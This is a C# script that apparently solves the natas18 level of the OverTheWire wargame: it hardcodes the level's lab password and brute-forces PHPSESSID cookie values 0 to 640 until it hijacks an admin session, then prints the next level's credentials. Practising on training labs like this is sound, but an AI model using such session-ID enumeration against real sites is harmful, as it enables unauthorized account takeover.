using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net;
using System.Net.Http;

namespace natas18
{
    class Program
    {
        static void Main(string[] args)
        {
            Task t = new Task(Force);
            t.Start();
            Console.ReadLine();
        }
        static async void Force()
        {
            string login = "natas18";
            string pass = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP";
            string url = "http://natas18.natas.labs.overthewire.org";

            HttpClientHandler handler = new HttpClientHandler();
            handler.Credentials = new NetworkCredential(login, pass);
            var cookieContainer = new CookieContainer();
            handler.CookieContainer = cookieContainer;
            HttpClient client = new HttpClient(handler);

            for (int i = 0; i < 641; i++)
            {
                var values = new Dictionary<string, string>
                {
                    {"PHPSESSID",""+i+""},
                };


                cookieContainer.Add(new Uri(url), new Cookie("PHPSESSID", "" + i + ""));

                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(url, content);
                var allContent = await response.Content.ReadAsStringAsync();
               
                
                //HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                //request.CookieContainer.Add(new Uri(url), new Cookie("PHPSESSID", "1"));
                //request.BeginGetResponse(new AsyncCallback(), request);


                //Console.WriteLine("{0}", allContent);
                if (i % 10 == 0)
                {
                    Console.WriteLine("Sesion number: {0}", i);
                }
                if (allContent.Contains("You are an admin"))
                {
                    var index = allContent.IndexOf("Username");
                    var password = allContent.Substring(index, 42 + 18);
                    //Console.WriteLine("{0}", allContent);
                    Console.WriteLine("Finally sesion: {0}", i);
                    Console.WriteLine("{0}", password);

                    
                    break;
                }
            }
        }

       
    }
}
